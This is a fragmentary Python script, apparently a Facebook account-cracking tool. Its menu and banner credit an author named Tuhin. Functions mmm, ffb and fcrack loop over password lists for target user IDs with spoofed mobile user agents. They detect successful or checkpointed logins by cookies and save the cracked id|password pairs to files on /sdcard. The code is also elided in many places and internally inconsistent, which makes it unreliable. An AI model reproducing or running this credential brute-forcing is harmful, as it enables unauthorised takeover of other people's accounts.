...
logo=("""
      ...
      \033[97;1m   ╚═╝    ╚═════╝ ╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝
\033[91;1m--------------------------------------------------
\033[97;1m>>     Owner    : Tuhin Ahmed
\033[97;1m>>     Facebook : MOHAMMAD TUHIN AHMED
\033[97;1m>>     Version  : 1.0
\033[97;1m>>     Git hop  : Tuhin Ahmed
...
def fia():    
			print(logo)
			print('\x1b[97;1m>>> Tuhin  VERSION :\x1b[1;92m 1.1 ')
			...
			if xd in ['1','01']:
				...
				os.system(f'xdg-open https://www.facebook.com/tuhin.vai.nasa.hocker.xode.na');menu()
			elif xd in ['0','00']:
				exit()
			else:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Tuhin] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(cps)));sys.stdout.flush()
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				print('\r\r\033[1;31m[Tuhin-CP] %s | %s'%(ids,pas))
				
				open('\x1b[91;1m/sdcard/Tuhin-CP.txt', 'a').write(ids+'|'+pas+'\n')
				oks.append(ids)
				break
			elif 'checkpoint' in Tuhin:
				if 'y' in pcp:
					print('\r\r\x1b[1;92m[Tuhin-OK] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Tuhin-OK.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def ffb(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write('\r\r\033[1;37m[Tuhin] %s|\033[1;32mOK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
	session = requests.Session()
	try:
		first = names.split(' ')[0]
		try:
		...
		for fikr in passlist:
			...
			if "c_user" in SHAHBAZ:
				...
				print('\r\r\033[1;32m[Tuhin-OK] %s | %s'%(ids,pas))
				...
				if 'y' in pcp:
					print('\r\r\x1b[38;5;208m[Tuhin-CP] '+ids+' | '+pas+'\033[1;97m')
					
					open('/sdcard/Tuhin-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
					break
...
def fcrack(uid,pwx,tl):
	...
	try:
		for ps in pwx:
			session = requests.Session()
			sys.stdout.write(f'\r [\033[1;97mTuhin\033[1;97m] %s|OK:-%s \r'%(loop,len(cps))),
			sys.stdout.flush()
			ua = random.choice(ugen)
	...
	'user-agent': 'Mozilla/5.0 (Linux; Android 11; Redmi Note 9 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.81 Mobile SFB/15.0.0034.21 Safari/537.36'
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\33[38;5;208m[Tuhin-CP] '+uid+' | '+ps+'\033[1;32m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\x1b[1;92m[Tuhin-OK] '+uid+' | '+ps+'\33[0;97m')
